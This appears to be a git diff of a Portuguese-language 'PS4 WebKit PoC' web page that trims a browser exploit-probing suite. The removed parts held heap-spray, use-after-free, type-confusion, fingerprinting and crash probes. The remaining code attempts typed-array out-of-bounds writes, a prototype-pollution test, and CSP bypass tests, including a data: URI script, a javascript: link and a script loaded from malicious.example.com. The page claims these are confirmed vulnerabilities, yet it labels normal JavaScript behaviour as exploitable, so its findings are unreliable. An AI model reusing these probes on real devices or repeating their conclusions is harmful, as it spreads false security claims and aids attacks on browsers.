@@ -2,21 +2,23 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit PoC - Testes Máximos v2</title> <style>
-        /* Estilos CSS */
-        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; /* Reduzido para caber mais log */}
-        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; /* Aumentado */ overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
+    <title>PS4 WebKit PoC - Focado</title>
+    <style>
+        /* Estilos CSS (Log Vulnerável Atualizado) */
+        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
+        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
         .log-info { color: #6cf; }
         .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
         .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
-        .log-vuln { color: #f44336; font-weight: bold; background-color: #444; padding: 2px 4px; display: inline-block;}
+        .log-vuln { color: #ff4444; /* Vermelho mais vivo */ font-weight: bold; /* Sem fundo */ }
         .log-good { color: #4CAF50; }
         .log-warn { color: #FFC107; }
         .log-error { color: #f44336; }
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit PoC - Demonstração Máxima v2</h1> <p>AVISO: Script extenso e agressivo. Pode ser lento e/ou travar o navegador. Observe o log. Teste CSP inclui link que requer clique manual.</p>
+    <h1>PS4 WebKit PoC - Demonstração Focada</h1>
+    <p>Script refinado mostrando apenas vulnerabilidades confirmadas (OOB Write, CSP Bypass, Prototype Pollution). Teste CSP inclui link que requer clique manual.</p>
     <div id="poc-output"></div>
 
     <script>
@@ -27,86 +29,48 @@
                 const timestamp = `[${new Date().toLocaleTimeString()}] `;
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                 outputDiv.innerHTML += `<span class="log-${type}">${timestamp}${sanitizedMessage}\n</span>`;
-                // Evitar auto-scroll excessivo que pode travar
-                if (Math.random() < 0.1) { // Scroll apenas ocasionalmente
-                   outputDiv.scrollTop = outputDiv.scrollHeight;
-                }
+                outputDiv.scrollTop = outputDiv.scrollHeight; // Reativar scroll sempre
             } else { console.error("Elemento #poc-output não encontrado!"); }
         };
 
-        const PAUSE_DURATION = 500; // Pausa mais curta entre testes principais
+        const PAUSE_DURATION = 500; // Pausa
 
-        // --- Funções de Teste Individuais ---
+        // --- Funções de Teste Mantidas ---
 
-        // Teste 1: OOB Write (Uint8) + Info Leak + Metadata Check
-        const runOOBTestLeakMeta = async () => {
-            log("--- Iniciando Teste 1: OOB Write (Uint8) + Leak + Meta ---", 'test');
+        // Teste 1: OOB Write (Uint8) Simplificado
+        const runOOBTestU8 = async () => {
+            log("--- Iniciando Teste 1: OOB Write (Uint8) ---", 'test');
             try {
                 const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
-                const initialByteLength = buffer.byteLength; const writeValue = 0xEE;
-                const writeOffsets = [-1, bufferSize, bufferSize + 10];
-                const readOffsets = [0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 4, bufferSize + 8];
+                const writeValue = 0xEE;
+                const writeOffsets = [-1, bufferSize, bufferSize + 10]; // Offsets chave
                 for (const writeOffset of writeOffsets) {
                     log(`Tentando escrita OOB U8 no offset ${writeOffset}...`, 'subtest');
-                    let writeSuccess = false;
                     try {
                         view[writeOffset] = writeValue;
                         log(`VULNERÁVEL: Escrita OOB U8 no offset ${writeOffset} bem-sucedida!`, 'vuln');
-                        writeSuccess = true;
-                        if (buffer.byteLength !== initialByteLength) { log(`VULNERÁVEL: byteLength alterado! Original: ${initialByteLength}, Atual: ${buffer.byteLength}`, 'vuln'); }
-                        else { log(`byteLength permaneceu ${buffer.byteLength}.`, 'info'); }
                     } catch (writeError) { log(`✅ Escrita OOB U8 bloqueada/erro: ${writeError.message}`, 'good'); }
-                    if (writeSuccess) {
-                        log(`Tentando ler (U8) após escrita OOB em ${writeOffset} (Info Leak Check)...`, 'info');
-                        for (const readOffset of readOffsets) {
-                            try {
-                                const readValue = view[readOffset]; const readValueHex = (readValue !== undefined ? `0x${readValue.toString(16)}` : 'undefined');
-                                if (readOffset >= bufferSize) {
-                                     log(`INFO LEAK? Leitura OOB U8 no offset ${readOffset} retornou: ${readValueHex}`, 'warn');
-                                     if(readValue !== undefined && readValue !== 0){ log(`VULNERÁVEL: Leitura OOB U8 retornou valor não nulo/definido (${readValueHex})!`, 'vuln'); }
-                                } else { log(`Leitura IN-BOUNDS U8 no offset ${readOffset} retornou: ${readValueHex}`, 'info'); }
-                            } catch (readError) { log(`Erro ao tentar ler U8 offset ${readOffset}: ${readError.message}`, 'warn'); }
-                        }
-                    }
-                    await new Promise(resolve => setTimeout(resolve, 50)); // Pausa curta
+                    await new Promise(resolve => setTimeout(resolve, 50));
                 }
-            } catch (e) { log(`Erro GERAL no teste OOB/Leak/Meta: ${e.message}`, 'warn'); }
+            } catch (e) { log(`Erro GERAL no teste OOB U8: ${e.message}`, 'warn'); }
             log("--- Teste 1 Concluído ---", 'test');
         };
 
         // Teste 2: OOB Write com Outros Tipos (Uint32)
         const runOOBOtherTypes = async () => {
-            log("--- Iniciando Teste 2: OOB Write com Outros Tipos (Uint32) ---", 'test');
+            log("--- Iniciando Teste 2: OOB Write (Uint32) ---", 'test');
              try {
-                const bufferSize = 32; // Bytes
-                const buffer = new ArrayBuffer(bufferSize);
-                const view = new Uint32Array(buffer); // Acesso como 32-bit integers
-                const numElements = bufferSize / 4; // 8 elementos
+                const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize);
+                const view = new Uint32Array(buffer); const numElements = bufferSize / 4;
                 const writeValue = 0xDEADBEEF;
-                const writeOffsets = [-1, numElements, numElements + 2];
-                const readOffsets = [0, numElements - 1, numElements, numElements + 1];
+                const writeOffsets = [-1, numElements, numElements + 2]; // Offsets de elemento
 
                  for (const writeOffset of writeOffsets) {
                     log(`Tentando escrita OOB U32 no offset de elemento ${writeOffset}...`, 'subtest');
-                    let writeSuccess = false;
                     try {
                         view[writeOffset] = writeValue;
                         log(`VULNERÁVEL: Escrita OOB U32 no offset ${writeOffset} bem-sucedida!`, 'vuln');
-                        writeSuccess = true;
                     } catch (writeError) { log(`✅ Escrita OOB U32 bloqueada/erro: ${writeError.message}`, 'good'); }
-
-                    if (writeSuccess) {
-                        log(`Tentando ler (U32) após escrita OOB em ${writeOffset}...`, 'info');
-                        for (const readOffset of readOffsets) {
-                            try {
-                                const readValue = view[readOffset]; const readValueHex = (readValue !== undefined ? `0x${readValue.toString(16)}` : 'undefined');
-                                if (readOffset >= numElements) {
-                                     log(`INFO LEAK? Leitura OOB U32 no offset ${readOffset} retornou: ${readValueHex}`, 'warn');
-                                     if(readValue !== undefined && readValue !== 0){ log(`VULNERÁVEL: Leitura OOB U32 retornou valor não nulo/definido (${readValueHex})!`, 'vuln'); }
-                                } else { log(`Leitura IN-BOUNDS U32 no offset ${readOffset} retornou: ${readValueHex}`, 'info'); }
-                            } catch (readError) { log(`Erro ao tentar ler U32 offset ${readOffset}: ${readError.message}`, 'warn'); }
-                        }
-                    }
                     await new Promise(resolve => setTimeout(resolve, 50));
                 }
             } catch (e) { log(`Erro GERAL no teste OOB U32: ${e.message}`, 'warn'); }
@@ -119,7 +83,7 @@
             try {
                 const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
                 const writeOffset = bufferSize; // Offset OOB
-                const valuesToWrite = [0, 0xFF, 0x80, 0x7F, -1, 128];
+                const valuesToWrite = [0, 0xFF, 128, -1]; // Valores chave
 
                 for(const value of valuesToWrite) {
                      log(`Tentando escrita OOB U8 no offset ${writeOffset} com valor ${value}...`, 'subtest');
@@ -133,94 +97,25 @@
             log("--- Teste 3 Concluído ---", 'test');
         };
 
-        // Teste 4: Tentativa de Heap Spray + OOB (Simplificado)
-        const runOOBHeapSprayAttempt = async () => {
-            log("--- Iniciando Teste 4: Tentativa de Heap Spray + OOB (Simplificado) ---", 'test');
-            log("AVISO: Este teste é uma SIMPLIFICAÇÃO. Controle real de heap é complexo.", 'warn');
-             try {
-                const spraySize = 50;
-                const bufferSize = 128;
-                const buffers = [];
-                log(`Alocando ${spraySize} buffers de ${bufferSize} bytes...`, 'info');
-                for(let i=0; i<spraySize; i++) {
-                    const buf = new ArrayBuffer(bufferSize);
-                    const v = new Uint8Array(buf);
-                    v.fill(i); // Preencher para identificar
-                    buffers.push(buf);
-                }
-                log("Alocação concluída.", 'info');
-
-                const attackIndex = Math.floor(spraySize / 2);
-                const victimIndex = attackIndex + 1;
-                if (victimIndex >= spraySize) { log("Índice inválido, pulando spray test", "warn"); return; }
-
-                const attackView = new Uint8Array(buffers[attackIndex]);
-                const victimView = new Uint8Array(buffers[victimIndex]);
-                const oobOffsets = [bufferSize, bufferSize + 16, bufferSize * 2];
-                const writeValue = 0xAB;
-                let spraySuccess = false;
-
-                for (const writeOffset of oobOffsets) {
-                    if(spraySuccess) break;
-                    const checkOffsetInVictim = writeOffset - bufferSize;
-
-                    if(checkOffsetInVictim >= 0 && checkOffsetInVictim < bufferSize) {
-                        log(`Buffer Atacante [${attackIndex}], Buffer Vítima [${victimIndex}]. Offset OOB: ${writeOffset}`, 'info');
-                        let valueBefore = 'error';
-                        try { valueBefore = victimView[checkOffsetInVictim]; } catch(e){ log(`Erro leitura prévia: ${e.message}`, 'warn');}
-                        log(`Valor Vítima[${checkOffsetInVictim}] ANTES: ${valueBefore} (Esperado: ${victimIndex})`, 'info');
-
-                        log(`Tentando escrita OOB no offset ${writeOffset} do buffer atacante...`, 'subtest');
-                        try {
-                            attackView[writeOffset] = writeValue;
-                            log(`VULNERÁVEL? Escrita OOB no spray bem-sucedida (sem erro)!`, 'vuln');
-
-                            await new Promise(resolve => setTimeout(resolve, 20));
-
-                            let valueAfter = 'error';
-                            try { valueAfter = victimView[checkOffsetInVictim]; } catch(e){ log(`Erro leitura pós: ${e.message}`, 'warn');}
-                            log(`Valor Vítima[${checkOffsetInVictim}] DEPOIS: ${valueAfter}`, 'info');
-
-                            if (valueAfter === writeValue && valueBefore !== writeValue) {
-                                log(`VULNERÁVEL: HEAP SPRAY SIMPLES bem-sucedido! Escrita OOB afetou outro buffer!`, 'vuln');
-                                spraySuccess = true;
-                            } else {
-                                log("Tentativa de sobrescrever buffer adjacente falhou ou não detectada para este offset.", 'warn');
-                            }
-                        } catch (writeError) {
-                            log(`✅ Escrita OOB no spray bloqueada/erro: ${writeError.message}`, 'good');
-                        }
-                    } else {
-                        log(`Skipping OOB offset ${writeOffset}, check offset ${checkOffsetInVictim} fora da vítima.`, 'info')
-                    }
-                }
-                if (!spraySuccess) {
-                    log("Tentativa geral de Heap Spray simplificado falhou.", 'warn');
-                }
-            } catch (e) { log(`Erro GERAL no teste Heap Spray: ${e.message}`, 'warn'); }
-            log("--- Teste 4 Concluído ---", 'test');
-        };
-
-        // Teste 5: CSP Bypass (Inclui teste de link javascript:)
+        // Teste 4: CSP Bypass (Inclui teste de link javascript:)
         const runCSPTest = () => {
-            log("--- Iniciando Teste 5: CSP Bypass ---", 'test');
-            // 5.1: data: URI
+            log("--- Iniciando Teste 4: CSP Bypass ---", 'test');
+            // 4.1: data: URI
             log("Tentando carregar script via data: URI...", 'info');
             try { const s=document.createElement('script'); s.src='data:text/javascript;base64,bG9nKCJWVUxORVLCgVZFTDogQnlwYXNzIGRlIENTUCB2aWEgZGF0YTogVVJJIGJlbS1zdWNlZGlkbyEiLCAndnVsbicpOw=='; document.body.appendChild(s); } catch (e) { log(`Erro data:: ${e.message}`, 'warn'); }
 
-            // 5.2: inline handler
+            // 4.2: inline handler
             log("Tentando executar script via inline handler (onerror)...", 'info');
             try { const i=document.createElement('img'); i.src='x'; i.onerror=()=>{log("VULNERÁVEL: Bypass de CSP via inline handler 'onerror' bem-sucedido!", 'vuln');}; document.body.appendChild(i); } catch (e) { log(`Erro onerror: ${e.message}`, 'warn'); }
 
-            // 5.3: fonte externa (bloqueio esperado)
+            // 4.3: fonte externa (bloqueio esperado)
             log("Tentando carregar script de fonte externa (deve ser bloqueado)...", 'info');
             try { const es=document.createElement('script'); es.src='https://malicious.example.com/blocked.js'; es.onload=()=>{log("ERRO CSP: NÃO bloqueou externo!", 'vuln');}; es.onerror=()=>{log("✅ Bloqueio CSP externo funcionou.", 'good');}; document.body.appendChild(es); } catch (e) { log(`Erro script ext: ${e.message}`, 'warn'); }
 
-            // 5.4: javascript: URI em link (NOVO TESTE - requer clique)
+            // 4.4: javascript: URI em link (requer clique)
             log("Tentando injetar link com javascript: URI (requer clique)...", 'info');
              try {
                 const jsLink = document.createElement('a');
-                // Usar log() aqui pode ser mais confiável que alert() dependendo das restrições
                 jsLink.href = "javascript:log('VULNERÁVEL: Bypass de CSP via javascript: URI em link clicado!', 'vuln'); try{alert('Bypass via javascript: URI!');}catch(e){log('Alerta bloqueado no javascript: URI', 'warn');}";
                 jsLink.textContent = "[Clique AQUI para Testar javascript: URI Bypass]";
                 jsLink.style.display = 'block'; jsLink.style.margin = '10px'; jsLink.style.padding = '5px';
@@ -229,140 +124,46 @@
                 log("Link com javascript: URI adicionado. Teste requer clique manual.", 'warn');
             } catch (e) { log(`Erro ao criar link javascript:: ${e.message}`, 'warn'); }
 
-            log("--- Teste 5 Concluído (Verifique logs e clique no link) ---", 'test');
+            log("--- Teste 4 Concluído (Verifique logs e clique no link) ---", 'test');
         };
 
-        // Teste 6: Prototype Pollution
+        // Teste 5: Prototype Pollution
         const runPrototypePollutionTest = () => {
-             log("--- Iniciando Teste 6: Prototype Pollution ---", 'test');
+             log("--- Iniciando Teste 5: Prototype Pollution ---", 'test');
             const k='poc_inj', v='Polluted!'; try { log(`Tentando poluir Object.prototype['${k}']...`, 'info'); Object.prototype[k]=v; const t={'w':window,'d':document,'n':{}}; let c=0; for(const n in t){ try { if(t[n] && t[n][k]===v){log(`VULNERÁVEL: PP detectada! ${n}.${k}=${t[n][k]}`, 'vuln'); c++;}} catch(e){} } if(c>0){log(`Confirmado: ${c} objeto(s) poluído(s).`, 'vuln');} else {log(`Aviso: Não confirmou poluição.`, 'warn');} try{delete Object.prototype[k];log("Limpou poluição.",'info');}catch(e){log(`Erro limpar PP: ${e.message}`,'warn');} } catch(e){log(`Erro GERAL PP: ${e.message}`,'warn');}
-             log("--- Teste 6 Concluído ---", 'test');
-        };
-
-        // Teste 7: Use-After-Free (UAF) Básico + SVG
-        const runUAFTests = async () => {
-            log("--- Iniciando Teste 7: Use-After-Free (UAF) Básico + SVG ---", 'test');
-            // Cenário 1: DOM Node
-            log("Cenário 1: Nó DOM.", 'subtest');
-            let uaf_cRef = null;
-            try {
-                let uaf_p = document.createElement('div'); let uaf_c = document.createElement('span');
-                uaf_p.appendChild(uaf_c); document.body.appendChild(uaf_p); uaf_cRef = uaf_c;
-                log("Nó DOM referenciado e adicionado.", 'info');
-                uaf_p.removeChild(uaf_c); document.body.removeChild(uaf_p); uaf_p=null; uaf_c=null;
-                log("Nós removidos. Tentando induzir GC...", 'info');
-                try { new ArrayBuffer(10*1024*1024); } catch(e) {} await new Promise(r => setTimeout(r, 200));
-                log("Tentando acessar .tagName da ref...", 'info'); let tn=uaf_cRef.tagName; log(`tagName ok: ${tn}`, 'warn');
-                log("Tentando chamar .getBoundingClientRect()...", 'info'); uaf_cRef.getBoundingClientRect(); log("getBoundingClientRect ok.", 'warn');
-            } catch (e) { log(`ERRO (Potencial UAF DOM): ${e.message}`, 'vuln');
-            } finally { uaf_cRef = null; }
-
-            // Cenário 2: Nó SVG
-            log("Cenário 2: Nó SVG.", 'subtest');
-            let svgRef = null;
-            const svgNS = "http://www.w3.org/2000/svg";
-            try {
-                let svgRoot = document.createElementNS(svgNS, "svg");
-                let svgRect = document.createElementNS(svgNS, "rect");
-                svgRoot.appendChild(svgRect); document.body.appendChild(svgRoot); svgRef = svgRect;
-                 log("Nó SVG referenciado e adicionado.", 'info');
-                svgRoot.removeChild(svgRect); document.body.removeChild(svgRoot); svgRoot=null; svgRect=null;
-                 log("Nós SVG removidos. Tentando induzir GC...", 'info');
-                try { new ArrayBuffer(10*1024*1024); } catch(e) {} await new Promise(r => setTimeout(r, 200));
-                log("Tentando acessar .id da ref SVG...", 'info'); let id=svgRef.id; log(`id ok: ${id}`, 'warn');
-                log("Tentando chamar .getBBox()...", 'info'); svgRef.getBBox(); log("getBBox ok.", 'warn');
-            } catch (e) { log(`ERRO (Potencial UAF SVG): ${e.message}`, 'vuln');
-            } finally { svgRef = null; }
-            log("--- Teste 7 Concluído ---", 'test');
-        };
-
-        // Teste 8: Type Confusion Básico + APIs Adicionais
-        const runTypeConfusionTests = () => {
-            log("--- Iniciando Teste 8: Type Confusion Básico + APIs ---", 'test');
-            // Cenários 1 & 2
-            log("Cenário 1 & 2: DOM APIs e .toFixed()", 'subtest');
-             try {window.postMessage(window,"*"); log("postMessage(win) ok.",'good');} catch(e){log(`Erro postMsg: ${e.message}`,'warn');}
-             try {document.dispatchEvent({ target: document.body, type: "click" }); log("dispatchEvent({}) ok.",'good');}catch(e){log(`Erro dispatchEv: ${e.message}`,'warn');}
-             try {let nP=5,nO=new Number(5);let r=nP.toFixed(nO);log(`.toFixed() ok: ${r}`,'good');} catch(e){log(`ERRO (.toFixed Pot. TC): ${e.message}`,'vuln');}
-
-            // Cenário 3: IndexedDB
-            log("Cenário 3: IndexedDB API", 'subtest');
-            if (window.indexedDB) {
-                try { log("Tentando indexedDB.open(123)...", 'info'); window.indexedDB.open(123, 1); log("indexedDB.open(123) sem erro.", 'warn'); }
-                catch (e) { log(`Erro esperado em indexedDB.open(123): ${e.message}`, 'good'); }
-            } else { log("IndexedDB não suportado.", 'info'); }
-
-            // Cenário 4: WebSocket
-             log("Cenário 4: WebSocket API", 'subtest');
-             if (window.WebSocket) {
-                 try { log("Tentando new WebSocket(123)...", 'info'); new window.WebSocket(123); log("new WebSocket(123) sem erro.", 'warn'); }
-                 catch (e) { log(`Erro esperado em new WebSocket(123): ${e.message}`, 'good'); }
-             } else { log("WebSocket não suportado.", 'info'); }
-            log("--- Teste 8 Concluído ---", 'test');
-        };
-
-        // Teste 9: Environment Probing
-        const runEnvironmentProbing = () => {
-            log("--- Iniciando Teste 9: Environment Probing ---", 'test');
-            try {
-                log("Propriedades de 'navigator':", 'subtest');
-                for (const key in navigator) { try { log(`  navigator.${key} = ${navigator[key]}`, 'info'); } catch (e) { /* Ignore */ } }
-            } catch (e) { log("Erro ao ler 'navigator'", 'warn'); }
-            try {
-                log("Propriedades de 'screen':", 'subtest');
-                 for (const key in screen) { try { log(`  screen.${key} = ${screen[key]}`, 'info'); } catch (e) { /* Ignore */ } }
-            } catch (e) { log("Erro ao ler 'screen'", 'warn'); }
-             try { log("Stack Trace de Erro:", 'subtest'); throw new TypeError("Erro de teste"); }
-             catch (e) { log(`  error.stack: ${e.stack}`, 'info'); }
-            log("--- Teste 9 Concluído ---", 'test');
-        };
-
-        // Teste 10: OOB Crash Probe
-        const runOOBCrashProbe = async () => {
-            log("--- Iniciando Teste 10: OOB Crash Probe ---", 'test');
-            log("AVISO: PODE TRAVAR!", 'warn'); await new Promise(resolve => setTimeout(resolve, 3000));
-            try { const b=new ArrayBuffer(32), v=new Uint8Array(b); const o=-20000, w=0xDEADBEEF; log(`Tentando escrita OOB AGRESSIVA offset ${o}...`, 'info'); v[o]=w; log(`AVISO: Escrita OOB agressiva NÃO travou.`, 'warn');
-            } catch (e) { log(`Erro crash probe (NÃO travou): ${e.message}`, 'warn'); } log("--- Teste 10 Concluído (se não travou) ---", 'test');
+             log("--- Teste 5 Concluído ---", 'test');
         };
 
 
         // --- Função Principal de Execução ---
         const runAllTests = async () => {
-            log("Iniciando todos os testes de PoC (VERSÃO MÁXIMA v2)...");
+            log("Iniciando testes de PoC (VERSÃO FOCADA)...");
             const tests = [
-                runOOBTestLeakMeta,       // Teste 1
-                runOOBOtherTypes,         // Teste 2
-                runOOBWriteValues,        // Teste 3
-                runOOBHeapSprayAttempt,   // Teste 4
-                runCSPTest,               // Teste 5 *Atualizado*
-                runPrototypePollutionTest,// Teste 6
-                runUAFTests,              // Teste 7
-                runTypeConfusionTests,    // Teste 8
-                runEnvironmentProbing,    // Teste 9
-                runOOBCrashProbe          // Teste 10 (Crash Probe - Último)
+                runOOBTestU8,             // Teste 1 - OOB U8
+                runOOBOtherTypes,         // Teste 2 - OOB U32
+                runOOBWriteValues,        // Teste 3 - OOB Valores
+                runCSPTest,               // Teste 4 - CSP Bypass
+                runPrototypePollutionTest // Teste 5 - Prototype Pollution
             ];
 
             for(let i=0; i < tests.length; i++){
-                // Adiciona verificação se o outputDiv ainda existe (em caso de crash parcial)
                 if (!document.getElementById('poc-output')) {
                      console.error("Output div sumiu, provável crash/problema.");
-                     break; // Interrompe a sequência
+                     break;
                 }
-                 // Adicionar try...catch geral para cada teste principal
                  try {
                     await tests[i]();
                  } catch(testError) {
                     log(`ERRO INESPERADO DURANTE TESTE ${i+1}: ${testError.message}`, 'error');
                  }
 
-                 if (i < tests.length - 1) { // Não pausar após o último
+                 if (i < tests.length - 1) {
                     log(`Pausa ${PAUSE_DURATION}ms...`, 'info');
                     await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
                  }
             }
 
-            // Esta mensagem pode não aparecer se o crash probe funcionar
-            log("\n\nTodos os testes PoC MÁXIMOS v2 foram concluídos (se não travou). Revise o log acima.", 'test');
+            log("\n\nTodos os testes PoC FOCADOS foram concluídos. Revise o log acima.", 'test');
         };
 
         // Executar ao carregar a página
